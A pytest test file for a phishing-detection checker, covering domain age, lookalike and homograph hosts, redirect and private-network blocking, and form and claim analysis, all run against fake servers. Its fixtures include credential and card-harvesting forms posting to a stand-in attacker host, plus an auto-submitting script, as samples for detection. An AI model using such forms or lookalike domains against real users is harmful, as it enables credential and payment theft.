"""Checker accuracy improvements (1–5): RDAP registration age, URL / identity checks, content and
reputation combinations, attribute-level claim verification, explainable and consistent verdicts.

Everything runs offline. RDAP servers, web sites and DNS are FAKES defined in this file (clearly
test doubles); the Public Suffix List and the official registry are the real shipped files
(registry approvals are applied to a temporary COPY with reviewer "Test Reviewer").
"""
from __future__ import annotations

import itertools
import json
import shutil
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from backend.app.channels.official.extract import Lexicon
from backend.app.channels.official.models import OfficialRecord
from backend.app.channels.official.registry import DEFAULT_REGISTRY_PATH, Registry, write_registry_atomic
from backend.app.channels.official.verify import verify_claim
from backend.app.config import Settings
from backend.app.core import scorer as core
from backend.app.intel import hostname, psl as psl_mod
from backend.app.intel.evidence import EvidenceGatherer
from backend.app.intel.feeds import url_key
from backend.app.intel.probe import PageProbe, RawResponse, parse_markup
from backend.app.intel.rdap import (NEW_DOMAIN_DAYS, NO_EVENT, NO_SERVICE, NOT_APPLICABLE, NOT_FOUND, OK,
                                    UNAVAILABLE, RDAPClient)
from backend.app.main import create_app
from backend.tests.conftest import login_as

NOW = datetime.now(timezone.utc)
_ids = itertools.count(1)
VERIFIED = ("uae-gov-portal uae-pass abu-dhabi-police dubai-police icp mohre rta dewa tamm wam "
            "abu-dhabi-media-office dubai-media-office khaleej-times gulf-news emirates-nbd").split()


# ================================================================== test doubles

def iso(dt: datetime) -> str:
    return dt.replace(microsecond=0).isoformat().replace("+00:00", "Z")


class FakeRDAP:
    """IANA bootstrap + registry RDAP answers. Records every URL requested."""

    def __init__(self, domains: dict[str, dict | int | Exception], tlds=("com", "ae", "top", "example", "net", "io")):
        self.domains = domains
        self.tlds = tlds
        self.requests: list[str] = []

    def __call__(self, url: str, timeout: float):
        self.requests.append(url)
        if url == "https://data.iana.org/rdap/dns.json":
            return 200, {"services": [[list(self.tlds), ["https://rdap.registry.test/"]]]}
        domain = url.rsplit("/domain/", 1)[-1]
        answer = self.domains.get(domain, 404)
        if isinstance(answer, Exception):
            raise answer
        if isinstance(answer, int):
            return answer, None
        return 200, answer


def rdap_record(registered_days_ago: int | None, *, changed_days_ago: int = 1) -> dict:
    events = [{"eventAction": "last changed", "eventDate": iso(NOW - timedelta(days=changed_days_ago))},
              {"eventAction": "expiration", "eventDate": iso(NOW + timedelta(days=300))}]
    if registered_days_ago is not None:
        events.append({"eventAction": "registration", "eventDate": iso(NOW - timedelta(days=registered_days_ago))})
    return {"objectClassName": "domain", "events": events}


class FakeWeb:
    """url → (status, headers, body). Records every request (method, headers)."""

    def __init__(self, pages: dict[str, tuple[int, dict, bytes | str]]):
        self.pages = pages
        self.requests: list[dict] = []

    def get_url(self, *, scheme, ip, host, path, headers, timeout):
        self.requests.append({"method": "GET", "url": f"{scheme}://{host}{path}", "ip": ip, "headers": dict(headers)})
        status, hdrs, body = self.pages.get(f"{scheme}://{host}{path}", (404, {"content-type": "text/html"}, b""))
        data = body.encode() if isinstance(body, str) else body
        return RawResponse(status=status, headers={k.lower(): v for k, v in hdrs.items()}, chunks=iter([data]),
                           close=lambda: None)


def resolver(mapping: dict[str, list[str]] | None = None):
    mapping = mapping or {}
    return lambda host: mapping.get(host, ["93.184.216.34"])


HTML = {"content-type": "text/html; charset=utf-8"}


def page(title: str, body: str = "", form: str = "") -> str:
    return f"<html><head><title>{title}</title></head><body><h1>{title}</h1><p>{body}</p>{form}</body></html>"


LOGIN_FORM = ('<form action="https://collect.evil-drop.top/p" method="post"><input name="username">'
              '<input type="password" name="pw"><input name="otp_code" placeholder="SMS code"></form>')
CARD_FORM = ('<form action="https://collect.evil-drop.top/c" method="post"><input name="cardnumber" '
             'autocomplete="cc-number"><input name="cvv"><input name="exp_date"></form>')


# ================================================================== app fixture

RANKS = {"google.com": 1, "youtube.com": 2, "whatsapp.com": 20, "etisalat.ae": 19589, "github.io": 50}


def write_list(path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text("".join(f"{r},{d}\n" for d, r in sorted(RANKS.items(), key=lambda kv: kv[1])), encoding="utf-8")
    path.with_suffix(".json").write_text(json.dumps({"list_id": "TEST", "retrieved_at": iso(NOW)}), encoding="utf-8")


@pytest.fixture
def env(tmp_path, monkeypatch):
    monkeypatch.setenv("AI_PROVIDER", "template")
    reg_path = tmp_path / "registry.yaml"
    shutil.copy(DEFAULT_REGISTRY_PATH, reg_path)
    reg = Registry.load(reg_path)
    for entry_id in VERIFIED:
        reg = write_registry_atomic(reg_path, reg.approved_mapping(entry_id, "Test Reviewer", NOW))
    list_path = tmp_path / "rep" / "top-sites.csv"
    write_list(list_path)
    settings = Settings(
        db_path=tmp_path / "d.db", evidence_dir=tmp_path / "e", gallery_dir=tmp_path / "g",
        web_dir=Path(__file__).resolve().parents[2] / "web", cors_origins=[], heartbeat_interval_s=1,
        crt_poll_interval_s=20, feed_poll_interval_s=20, pipeline_poll_interval_s=1, ai_state="template",
        official_snapshot_dir=tmp_path / "snap", scan_rate_per_min=1000, reputation_list_path=list_path,
        reputation_top_n=60_000,
    )
    app = create_app(settings)
    with TestClient(app) as client:
        rt = app.state.runtime
        rt.trust_policy.registry = Registry.load(reg_path)
        rt.maybe_reload_registry()
        yield client, app


def install(app, *, rdap: FakeRDAP | None = None, web: FakeWeb | None = None, dns=None) -> None:
    rt = app.state.runtime
    rt.trust_policy.gatherer = EvidenceGatherer(
        rdap=RDAPClient(fetch=rdap or FakeRDAP({})),
        probe=PageProbe(transport=web or FakeWeb({}), resolver=dns or resolver()),
        repo=rt.repo, deadline_s=5)


def check(client, value):
    r = client.post("/api/check", json={"input": value, "lang": "en", "request_id": f"acc-{next(_ids):06d}"})
    assert r.status_code in (200, 201), r.text
    return r.json()


def names(f) -> dict:
    return {s["name"]: s["weight"] for s in f["signals"]}


# ================================================================== 1. RDAP registration age

def test_rdap_sends_only_the_registrable_domain():
    fake = FakeRDAP({"adpolice.gov.ae": rdap_record(9000)})
    age = RDAPClient(fetch=fake).lookup("es.adpolice.gov.ae")
    assert age.status == OK and age.domain == "adpolice.gov.ae" and age.age_days >= 8999
    domain_requests = [u for u in fake.requests if "/domain/" in u]
    assert domain_requests == ["https://rdap.registry.test/domain/adpolice.gov.ae"]     # no host, path or query
    assert age.source == "https://rdap.registry.test/" and age.checked_at and age.registered_at


def test_only_the_registration_event_counts():
    fake = FakeRDAP({"old-but-just-changed.com": rdap_record(4000, changed_days_ago=0),
                     "no-registration-event.com": rdap_record(None, changed_days_ago=2)})
    client = RDAPClient(fetch=fake)
    old = client.lookup("old-but-just-changed.com")
    assert old.status == OK and old.age_days >= 3999                 # 'last changed' yesterday is ignored
    none = client.lookup("no-registration-event.com")
    assert none.status == NO_EVENT and none.age_days is None and not none.known   # never 'last changed'


@pytest.mark.parametrize("answer,status", [(404, NOT_FOUND), (503, UNAVAILABLE), (TimeoutError("t"), UNAVAILABLE)])
def test_failed_lookup_means_age_unknown(answer, status):
    age = RDAPClient(fetch=FakeRDAP({"x-shop.com": answer})).lookup("x-shop.com")
    assert age.status == status and age.age_days is None and not age.known and not age.recently_registered


def test_tld_without_rdap_and_unreachable_bootstrap_are_unknown():
    assert RDAPClient(fetch=FakeRDAP({}, tlds=("com",))).lookup("shop.ae").status == NO_SERVICE

    def down(url, timeout):
        raise OSError("no network")
    age = RDAPClient(fetch=down).lookup("shop.com")
    assert age.status == UNAVAILABLE and age.age_days is None


def test_platform_tenant_and_ip_do_not_inherit_provider_age():
    fake = FakeRDAP({"github.io": rdap_record(6000)})
    client = RDAPClient(fetch=fake)
    tenant = client.lookup("evil-shop.github.io")
    assert tenant.status == NOT_APPLICABLE and tenant.age_days is None and "shared platform" in tenant.reason
    assert client.lookup("93.184.216.34").status == NOT_APPLICABLE
    assert not [u for u in fake.requests if "/domain/" in u]           # nothing was asked about github.io


def test_rdap_results_are_cached():
    fake = FakeRDAP({"cached-domain.com": rdap_record(10)})
    client = RDAPClient(fetch=fake)
    client.lookup("a.cached-domain.com")
    client.lookup("b.cached-domain.com")
    assert len([u for u in fake.requests if "/domain/" in u]) == 1


def test_young_domain_is_weak_and_only_counts_with_other_evidence(scoring_kwargs):
    clean = core.score_url("https://sunflower-garden-store.com/", context={"domain_age_days": 3}, **scoring_kwargs)
    assert "infra.domain_recently_registered" not in clean.l1_detail and clean.verdict == "UNKNOWN"
    lure = core.score_url("https://sunflower-garden-store.top/verify-account", context={"domain_age_days": 3}, **scoring_kwargs)
    base = core.score_url("https://sunflower-garden-store.top/verify-account", **scoring_kwargs)
    assert lure.l1_detail["infra.domain_recently_registered"] == 0.15
    assert lure.score == pytest.approx(min(1.0, base.score + 0.15))
    old = core.score_url("https://sunflower-garden-store.top/verify-account", context={"domain_age_days": 9000}, **scoring_kwargs)
    assert old.score == base.score                                    # old age adds nothing, cancels nothing
    assert NEW_DOMAIN_DAYS == 30


def test_age_alone_never_earns_safe_and_new_domain_alone_is_not_fake(env):
    client, app = env
    install(app, rdap=FakeRDAP({"very-old-unknown-site.com": rdap_record(9000),
                                "blue-pebble-bakery.com": rdap_record(2)}),
            web=FakeWeb({"https://blue-pebble-bakery.com/": (200, HTML, page("Welcome"))}))
    old = check(client, "https://very-old-unknown-site.com/")         # old, but the page cannot be retrieved
    assert old["tag"] == "WARNING" and old["domain_auth"]["established"]["status"] == "not_established"
    assert old["live_evidence"]["domain_age"]["age_days"] >= 8999
    new = check(client, "https://blue-pebble-bakery.com/")
    assert new["tag"] == "WARNING" and "infra.domain_recently_registered" not in names(new)
    rec = {r["id"]: r for r in new["evidence"]}["domain_age"]
    assert rec["status"] == OK and rec["observed"]["age_days"] <= 2


def test_radar_certificate_age_never_uses_registration_date(monkeypatch, tmp_path):
    import asyncio
    from backend.app.catalog import load_catalogs
    from backend.app.radar.enrich import Enricher
    settings = Settings(db_path=tmp_path / "d.db", enrich_enabled=True, http_timeout_s=1)
    enr = Enricher(settings, load_catalogs())

    async def rdap(_d):
        return {"rdap_created": "2001-01-01T00:00:00Z", "rdap_registrar": None}

    async def nothing(_d):
        return {}
    monkeypatch.setattr(enr, "_rdap", rdap)
    for m in ("_dns", "_tls", "_favicon"):
        monkeypatch.setattr(enr, m, nothing)
    out = asyncio.run(enr.enrich("example-domain.com"))
    assert out["rdap_created"] == "2001-01-01T00:00:00Z" and out["cert_age_hours"] is None


# ================================================================== 2. URL and identity

def test_public_suffix_list_rules():
    p = psl_mod.default()
    assert p.registrable("es.adpolice.gov.ae") == "adpolice.gov.ae"
    assert p.registrable("www.city.kawasaki.jp") == "city.kawasaki.jp"      # exception rule
    assert p.registrable("shop.github.io") == "github.io" and p.site("shop.github.io") == "shop.github.io"
    assert p.platform("shop.github.io") == "github.io" and p.platform("github.com") is None
    assert p.registrable("foo.bar.co.uk") == "bar.co.uk"


@pytest.mark.parametrize("url,ip", [("http://2130706433/", "127.0.0.1"), ("http://0x7f000001/", "127.0.0.1"),
                                    ("http://0177.0.0.1/", "127.0.0.1"), ("http://3232235777/x", "192.168.1.1")])
def test_encoded_ip_hosts_are_detected(url, ip):
    sig = hostname.obfuscation_signals(url)
    assert [s.name for s in sig] == ["lexical.obfuscated_ip_host"] and ip in sig[0].reason


def test_invisible_characters_in_host():
    assert [s.name for s in hostname.obfuscation_signals("https://ad​police.gov.ae/")] == ["lexical.invisible_chars_host"]


@pytest.mark.parametrize("url,signal", [
    ("https://icp.gov.ae.verify-id.com/", "identity.deceptive_subdomain"),
    ("https://login.uaepass.ae-verify.com/", "identity.deceptive_subdomain"),
    ("https://tamm-abudhabi.com/", "identity.deceptive_subdomain"),
    ("https://uaepas.ae/", "identity.registry_lookalike"),
    ("https://dubaipolise.gov.ae.com/", "identity.registry_lookalike"),
    ("https://emiratesnbd-rewards.com/", "identity.registry_name_reuse"),
])
def test_deceptive_subdomains_and_registry_lookalikes(url, signal):
    found = hostname.identity_signals(hostname.raw_host(url), Registry.load())
    assert [s.name for s in found] == [signal]


@pytest.mark.parametrize("url", ["https://www.icp.gov.ae/", "https://es.adpolice.gov.ae/", "https://www.youtube.com/",
                                 "https://police-fines-pay.example/", "https://housing-grant-info.example/"])
def test_genuine_hosts_and_generic_words_are_not_flagged(url):
    assert hostname.identity_signals(hostname.raw_host(url), Registry.load()) == []


@pytest.mark.parametrize("url", ["https://موقع.امارات/", "https://xn--4gbrim.xn--mgbaam7a8h/", "https://مثال.مصر/",
                                 "https://例え.jp/"])
def test_internationalised_domains_are_not_suspicious_by_themselves(env, url):
    client, app = env
    install(app)
    f = check(client, url)
    assert f["tag"] == "WARNING" and f["verdict"] == "UNKNOWN", f["signals"]
    assert not [s for s in f["signals"] if s["name"].startswith(("homograph.", "identity.", "lexical.punycode"))]


def test_mixed_script_homograph_of_registry_domain_is_fake(env):
    client, app = env
    install(app)
    f = check(client, "https://аdpolice.gov.ae/")                     # Cyrillic а
    assert f["tag"] == "FAKE"


def test_deceptive_subdomain_through_the_checker(env):
    client, app = env
    install(app)
    f = check(client, "https://icp.gov.ae.verify-id.com/login")
    assert f["tag"] in ("FAKE", "MISLEADING") and "identity.deceptive_subdomain" in names(f)
    assert any(s["category"] == "government_impersonation" for s in f["signals"])


def test_unknown_link_does_not_inherit_safe_from_a_government_redirect(env):
    client, app = env
    install(app, web=FakeWeb({
        "https://go-short-link.com/x": (302, {"location": "https://www.icp.gov.ae/en/"}, b""),
        "https://www.icp.gov.ae/en/": (200, HTML, page("ICP")),
    }))
    f = check(client, "https://go-short-link.com/x")
    assert f["tag"] != "SAFE"
    assert f["final_domain_auth"]["authenticated"] is True
    assert "REDIRECT_TO_OFFICIAL_NOT_INHERITED" in f["reason_codes"]
    assert f["live_evidence"]["page"]["final_host"] == "www.icp.gov.ae"


def test_safe_site_redirecting_to_an_untrusted_host_loses_safe(env):
    client, app = env
    install(app, web=FakeWeb({
        "https://www.youtube.com/redirect": (302, {"location": "https://prize-claim-now.top/win"}, b""),
        "https://prize-claim-now.top/win": (200, HTML, page("Claim")),
    }))
    f = check(client, "https://www.youtube.com/redirect")
    assert f["domain_auth"]["status"] == "REPUTABLE_SITE"
    assert f["tag"] == "WARNING" and f["manual_review"] is True
    assert "REDIRECT_OFF_TRUSTED_SITE" in f["reason_codes"]


def test_redirect_to_private_network_is_blocked_and_flagged(env):
    client, app = env
    web = FakeWeb({"http://innocent-looking.com/": (302, {"location": "http://router.internal/admin"}, b"")})
    install(app, web=web, dns=resolver({"router.internal": ["192.168.1.1"]}))
    f = check(client, "http://innocent-looking.com/")
    page_ev = f["live_evidence"]["page"]
    assert page_ev["status"] == "blocked" and page_ev["error_code"] == "private_address"
    assert [r["url"] for r in web.requests] == ["http://innocent-looking.com/"]        # never connected inside
    assert "infra.redirect_to_private_network" in names(f)


@pytest.mark.parametrize("url,code", [("https://user:pw@host.com/", "credentials_in_url"),
                                      ("https://host.com:8443/", "port_not_allowed"),
                                      ("ftp://host.com/", "scheme_not_allowed")])
def test_probe_refuses_unsafe_targets(url, code):
    web = FakeWeb({})
    result = PageProbe(transport=web, resolver=resolver()).probe(url)
    assert result.status == "blocked" and result.error_code == code and web.requests == []


def test_dns_to_private_address_is_never_fetched():
    web = FakeWeb({})
    result = PageProbe(transport=web, resolver=resolver({"rebind.test.com": ["10.0.0.7"]})).probe("https://rebind.test.com/")
    assert result.error_code == "private_address" and web.requests == []


# ================================================================== 3. content and reputation

def test_markup_is_read_not_executed_and_forms_are_never_submitted():
    web = FakeWeb({"https://shop-x.com/": (200, HTML, page("Shop", "", LOGIN_FORM) +
                                          "<script>fetch('https://track.example/x');document.forms[0].submit()</script>")})
    result = PageProbe(transport=web, resolver=resolver()).probe("https://shop-x.com/")
    assert result.status == "ok" and len(web.requests) == 1 and web.requests[0]["method"] == "GET"
    form = result.facts.forms[0]
    assert form.password and form.otp and form.action_host == "collect.evil-drop.top"
    headers = {k.lower() for k in web.requests[0]["headers"]}
    assert not headers & {"cookie", "referer", "authorization"}


def test_meta_refresh_is_followed_once_through_the_same_checks():
    web = FakeWeb({"https://a-site.com/": (200, HTML, '<meta http-equiv="refresh" content="0;url=https://b-site.com/">'),
                   "https://b-site.com/": (200, HTML, page("B"))})
    result = PageProbe(transport=web, resolver=resolver()).probe("https://a-site.com/")
    assert result.final_host == "b-site.com" and result.status == "ok"


def test_government_identity_plus_unauthorised_host_plus_credential_form_is_fake(env):
    client, app = env
    install(app, web=FakeWeb({"https://fines-portal-uae.com/": (200, HTML, page(
        "Abu Dhabi Police — pay your traffic fine", "Abu Dhabi Police official fine payment", LOGIN_FORM))}))
    f = check(client, "https://fines-portal-uae.com/")
    sig = names(f)
    assert f["tag"] == "FAKE"
    assert sig["content.gov_identity_credential_harvest"] == 0.75
    # one form = one observation: the weaker form signals stay visible but are counted once
    assert sig.get("content.form_action_mismatch") == 0.0 and sig.get("content.credential_form") == 0.0
    assert any(s["category"] == "government_impersonation" for s in f["signals"])


def test_signals_from_one_form_are_not_independent_confirmation(env):
    client, app = env
    install(app, web=FakeWeb({"https://some-checkout-page.com/": (200, HTML, page("Checkout", "", CARD_FORM))}))
    f = check(client, "https://some-checkout-page.com/")
    form = {s["name"]: s["weight"] for s in f["signals"] if s.get("group") == "form"}
    assert sorted(form.values(), reverse=True)[0] == 0.30 and sorted(form.values())[0] == 0.0
    assert sum(form.values()) == pytest.approx(0.30)


def test_legitimate_sign_in_and_payment_providers_are_not_a_mismatch(env):
    client, app = env
    sso = ('<form action="https://id.uaepass.ae/idshub/authorize" method="get"><input name="uid">'
           '<input type="password" name="pw"></form>')
    pay = ('<form action="https://secure.telr.com/gateway/process" method="post"><input name="cardnumber" '
           'autocomplete="cc-number"><input name="cvv"></form>')
    install(app, web=FakeWeb({"https://local-store-a.com/": (200, HTML, page("Store", "", sso)),
                              "https://local-store-b.com/": (200, HTML, page("Store", "", pay))}))
    for url in ("https://local-store-a.com/", "https://local-store-b.com/"):
        f = check(client, url)
        assert "content.form_action_mismatch" not in names(f), url
        assert f["tag"] == "WARNING"


def test_genuine_government_page_with_its_own_login_stays_safe(env):
    client, app = env
    install(app, web=FakeWeb({"https://smartservices.icp.gov.ae/": (200, HTML, page(
        "ICP Smart Services", "Federal Authority for Identity, Citizenship",
        '<form action="/login" method="post"><input name="u"><input type="password" name="p"></form>'))}))
    f = check(client, "https://smartservices.icp.gov.ae/")
    assert f["tag"] == "SAFE" and f["domain_auth"]["authenticated"] is True


def test_confirmed_bad_url_vs_bad_host_and_shared_platforms(env):
    client, app = env
    install(app)
    repo = app.state.runtime.repo
    repo.upsert_feed_urls([url_key("https://evil-login-page.com/secure/verify"),
                           url_key("https://docs.google.com/forms/d/e/PHISH/viewform")], source="openphish")
    exact = check(client, "https://evil-login-page.com/secure/verify")
    assert names(exact).get("feeds.phishtank_confirmed") == 0.70 and exact["tag"] == "FAKE"
    other = check(client, "https://evil-login-page.com/about")
    assert names(other).get("feeds.host_listed") == 0.40 and "feeds.phishtank_confirmed" not in names(other)
    forms = check(client, "https://docs.google.com/forms/d/e/SOMETHING-ELSE/viewform")
    assert "feeds.host_listed" not in names(forms)                   # shared host: URL-level only
    listed = check(client, "https://docs.google.com/forms/d/e/PHISH/viewform")
    assert "feeds.phishtank_confirmed" in names(listed)


def test_feed_miss_is_not_proof_of_safety(env):
    client, app = env
    install(app)
    nodata = check(client, "https://never-listed-site.com/")
    rec = {r["id"]: r for r in nodata["evidence"]}["feeds"]
    assert rec["status"] == "no_data" and nodata["tag"] == "WARNING"
    app.state.runtime.repo.upsert_feed_urls([url_key("https://other-bad.com/x")], source="urlhaus")
    miss = check(client, "https://never-listed-site-2.com/")
    rec = {r["id"]: r for r in miss["evidence"]}["feeds"]
    assert rec["status"] == "checked" and "miss is not proof" in rec["summary"] and miss["tag"] == "WARNING"


def test_radar_feed_poller_keeps_urls_and_never_labels_a_shared_platform(tmp_path):
    from backend.app.catalog import load_catalogs
    from backend.app.radar.feeds import PhishFeeds
    feeds = PhishFeeds(Settings(db_path=tmp_path / "d.db"), load_catalogs(), repo=None, cursors=None)
    assert feeds._registrable("https://docs.google.com/forms/d/e/X/viewform") is None
    assert feeds._registrable("https://evil-shop.github.io/login") == "evil-shop.github.io"
    assert feeds._registrable("https://bit.ly/abc") is None
    assert feeds._registrable("http://www.phish-site.top/a") == "phish-site.top"
    assert {k for k, _ in feeds._url_rows} >= {"docs.google.com/forms/d/e/X/viewform", "evil-shop.github.io/login"}


# ================================================================== 4. claim verification

def _entry(eid, org, domain, cls, juris, scope=(), cats=("announcement",)):
    return {"id": eid, "organization": org, "aliases": {"en": [org], "ar": [], "translit": []}, "domains": [domain],
            "subdomain_policy": "exact", "source_class": cls, "jurisdiction": juris, "authority_scope": list(scope),
            "categories": list(cats), "languages": ["en"],
            "source_urls": [{"url": f"https://{domain}/news", "kind": "html", "terms_reviewed": True}] if cls != "C" else [],
            "provenance": "SYNTHETIC UNIT-TEST DOUBLE", "status": "approved", "reviewer": "SYNTHETIC-TEST-REVIEWER",
            "verified_at": iso(NOW - timedelta(days=1)), "max_age_days": 180, "synthetic": True}


CLAIM_REGISTRY = Registry.from_mapping({"entries": [
    _entry("dxb-parking", "Synthetic Dubai Parking Authority", "parking.dubai.example", "A", "dubai", ["fees"], ["fees"]),
    _entry("auh-parking", "Synthetic Abu Dhabi Parking Authority", "parking.abudhabi.example", "A", "abu_dhabi",
           ["fees"], ["fees"]),
    _entry("fed-media", "Synthetic Federal News Agency", "agency.example", "B", "federal"),
    _entry("indep-news", "Synthetic Daily", "daily.example", "C", "federal"),
]}, allow_synthetic=True)


def rec(eid, domain, content, rid=None):
    return OfficialRecord(rid or f"r-{eid}-{abs(hash(content)) % 10**6}", eid, f"https://{domain}/news/1", content,
                          iso(NOW - timedelta(hours=2)), iso(NOW - timedelta(days=1)), "notice")


def verify(text, records):
    return verify_claim(text, registry=CLAIM_REGISTRY, lexicon=Lexicon.load(), records=records, now=NOW)


CLAIM = "Synthetic Dubai Parking Authority announces a parking fee of AED 500 from 1 December 2026."


def test_claim_verified_when_authority_jurisdiction_service_amount_and_date_match():
    g = verify(CLAIM, [rec("dxb-parking", "parking.dubai.example",
                           "Synthetic Dubai Parking Authority: the parking fee is AED 500 from 1 December 2026.")])
    assert g.status == "VERIFIED"
    attrs = g.evidence[0].attributes
    assert attrs == {"authority": "match", "jurisdiction": "match", "service": "match", "amount": "match",
                     "effective_date": "match"}
    assert g.checked_sources and g.evidence[0].role == "decisive"


def test_different_effective_date_is_not_verification():
    g = verify(CLAIM, [rec("dxb-parking", "parking.dubai.example",
                           "Synthetic Dubai Parking Authority: the parking fee is AED 500 from 1 January 2027.")])
    assert g.status != "VERIFIED"
    assert g.evidence[0].attributes["effective_date"] == "differs"


def test_different_amount_contradicts():
    g = verify(CLAIM, [rec("dxb-parking", "parking.dubai.example",
                           "Synthetic Dubai Parking Authority: the parking fee is AED 50 from 1 December 2026.")])
    assert g.status == "CONTRADICTED" and g.evidence[0].attributes["amount"] == "differs"


def test_another_authority_or_jurisdiction_cannot_verify():
    g = verify(CLAIM, [rec("auh-parking", "parking.abudhabi.example",
                           "Synthetic Abu Dhabi Parking Authority: the parking fee is AED 500 from 1 December 2026.")])
    assert g.status != "VERIFIED"


def test_class_b_alone_cannot_establish_a_fee_claim_but_can_confirm_an_announcement():
    fee = verify(CLAIM, [rec("fed-media", "agency.example",
                             "Synthetic Dubai Parking Authority announced the parking fee is AED 500 from 1 December 2026.")])
    assert fee.status != "VERIFIED"
    assert any("cannot establish" in n for n in fee.notes)
    ann = verify("Synthetic Federal News Agency announces National Day celebrations on 2 December 2026.",
                 [rec("fed-media", "agency.example",
                      "Synthetic Federal News Agency announces National Day celebrations on 2 December 2026.")])
    assert ann.status == "VERIFIED"


def test_class_c_is_supporting_context_only():
    g = verify(CLAIM, [rec("indep-news", "daily.example",
                           "Synthetic Dubai Parking Authority: the parking fee is AED 500 from 1 December 2026.")])
    assert g.status != "VERIFIED"
    assert all(e.role == "supporting_context" for e in g.evidence)


def test_what_was_checked_and_not_checked_is_recorded():
    g = verify(CLAIM, [])
    assert g.status in ("SOURCE_UNAVAILABLE", "NOT_VERIFIABLE")
    assert "dxb-parking" in g.unchecked_sources and not g.checked_sources
    assert any("not checked" in n for n in g.notes)


# ================================================================== 5. explainable and consistent

def test_reason_codes_align_with_reasons_and_are_known(env):
    client, app = env
    install(app)
    for url in ("https://www.icp.gov.ae/", "https://www.youtube.com/", "https://unknown-small-shop.com/",
                "https://adpolice-gov.ae/", "https://www.thenationalnews.com/"):
        f = check(client, url)
        assert len(f["reason_codes"]) == len(f["trust_reasons"]), url
        assert "OTHER" not in f["reason_codes"], (url, f["trust_reasons"])


def test_every_evidence_source_reports_status_and_freshness(env):
    client, app = env
    install(app, rdap=FakeRDAP({"fresh-check-site.com": rdap_record(400)}),
            web=FakeWeb({"https://fresh-check-site.com/": (200, HTML, page("Hi"))}))
    f = check(client, "https://fresh-check-site.com/")
    recs = {r["id"]: r for r in f["evidence"]}
    assert set(recs) >= {"registry", "reputation", "domain_age", "page", "feeds"}
    for r in recs.values():
        assert r.get("status") and r.get("checked_at"), r
    assert recs["reputation"]["data_updated_at"] and recs["registry"]["version"]


def test_checker_portal_and_stored_record_agree(env):
    client, app = env
    install(app, web=FakeWeb({"https://fines-portal-uae.com/": (200, HTML, page(
        "Abu Dhabi Police — pay your traffic fine", "Abu Dhabi Police", LOGIN_FORM))}))
    f = check(client, "https://fines-portal-uae.com/")
    login_as(client, app, "viewer")
    detail = client.get(f"/api/finding/{f['id']}").json()
    assert detail["tag"] == f["tag"] == "FAKE"
    assert detail["reason_codes"] == f["reason_codes"] and detail["evidence"] == f["evidence"]
    listed = client.get("/api/portal/findings", params={"q": "fines-portal"}).json()["findings"]
    assert [x["tag"] for x in listed if x["id"] == f["id"]] == ["FAKE"]
    assert app.state.runtime.repo.get_finding(f["id"])["tag"] == "FAKE"


def test_extension_scan_and_sweep_use_the_same_central_verdict_offline(env):
    client, app = env
    install(app)
    rt = app.state.runtime
    for url in ("https://icp.gov.ae.verify-id.com/", "https://www.youtube.com/", "https://www.icp.gov.ae/"):
        scan = client.post("/api/scan", json={"kind": "url", "input": url}).json()
        sweep = rt.trust_policy.assess_url(url)
        assert scan["tag"] == sweep["tag"], url
        assert scan["live_evidence"] is None              # /api/scan makes no live outbound calls
        assert scan["reason_codes"] == sweep["reason_codes"]


def test_guard_never_blocks_registry_or_widely_used_domains(env):
    _, app = env
    rt = app.state.runtime
    for url in ("https://www.youtube.com/watch", "https://www.icp.gov.ae/x"):
        out = rt.trust_policy.assess_url(url, context={"phishtank_confirmed": True})
        assert out["tag"] == "FAKE" and out["blockable"] is False


def test_rdap_and_probe_receive_no_user_data(env):
    client, app = env
    rdap = FakeRDAP({"privacy-check-site.com": rdap_record(100)})
    web = FakeWeb({"https://privacy-check-site.com/p": (200, HTML, page("x"))})
    install(app, rdap=rdap, web=web)
    client.post("/api/check", json={"input": "https://privacy-check-site.com/p?utm_source=mail#frag",
                                    "lang": "en", "request_id": f"acc-{next(_ids):06d}"},
                headers={"Cookie": "daggers_session=secret", "Authorization": "Bearer secret"})
    assert [u for u in rdap.requests if "/domain/" in u] == ["https://rdap.registry.test/domain/privacy-check-site.com"]
    sent = web.requests[0]
    assert "utm_source" not in sent["url"] and "frag" not in sent["url"]
    assert not {k.lower() for k in sent["headers"]} & {"cookie", "authorization", "referer", "x-forwarded-for"}
    assert "secret" not in json.dumps(sent)


# ================================================================== name-only brand matches (false positives)

@pytest.mark.parametrize("url,tag", [
    ("https://noon-chi.com/", "WARNING"),                 # a brand name in another domain: caution, not fraud
    ("https://fab-garden.com/", "WARNING"),
    ("https://noon-login-verify.com/", "FAKE"),           # brand + lure words in the name
    ("https://mashreq-update-account.com/", "FAKE"),
    ("https://adcb-secure-login.xyz/", "FAKE"),           # brand + lure + risky TLD
    ("https://adpolice-gov.ae/", "FAKE"),                 # government name: never capped
])
def test_brand_name_alone_is_warning_not_fake(env, url, tag):
    client, app = env
    install(app)
    f = check(client, url)
    assert f["tag"] == tag, (url, f["signals"])


def test_established_website_is_safe_when_every_factor_agrees(env):
    client, app = env
    install(app, rdap=FakeRDAP({"old-family-bakery.com": rdap_record(3000)}),
            web=FakeWeb({"https://old-family-bakery.com/": (200, HTML, page("Bakery"))}))
    f = check(client, "https://old-family-bakery.com/")
    assert f["tag"] == "SAFE" and f["domain_auth"]["status"] == "ESTABLISHED_SITE"
    assert f["domain_auth"]["authenticated"] is False and f["domain_auth"]["legitimate_site"] is True
    est = f["domain_auth"]["established"]
    assert est["basis"] == "registration (RDAP)" and est["years"] == 8
    assert "ESTABLISHED_SITE" in f["reason_codes"]
    rec = {r["id"]: r for r in f["evidence"]}["domain_age"]
    assert "established domain" in rec["summary"]



@pytest.mark.parametrize("url,lure", [
    ("https://some-shop.com/en/c/mobile/add-ons/unlimited-ksa-roaming.html", False),
    ("https://some-shop.com/freedom-sale", False),
    ("https://some-shop.com/secure-login", True),
    ("https://some-shop.com/securelogin", True),
    ("https://some-shop.com/free-gift", True),
    ("https://some-shop.com/limited-offer", True),
])
def test_lure_words_match_whole_words_not_fragments(scoring_kwargs, url, lure):
    assert ("lexical.lure_keyword" in core.score_url(url, **scoring_kwargs).l1_detail) is lure


def test_pending_company_entry_still_uses_the_ranking(env):
    client, app = env
    install(app)
    f = check(client, "https://www.etisalat.ae/")                  # etisalat-uae pending, etisalat.ae ranked
    assert f["tag"] == "SAFE" and f["domain_auth"]["status"] == "REPUTABLE_SITE"


# ================================================================== established website (multi-factor)

CT_OLD = [{"id": "1", "not_before": iso(NOW - timedelta(days=2000))}, {"id": "2", "not_before": iso(NOW - timedelta(days=50))}]


def fake_ct(payloads: dict):
    calls = []

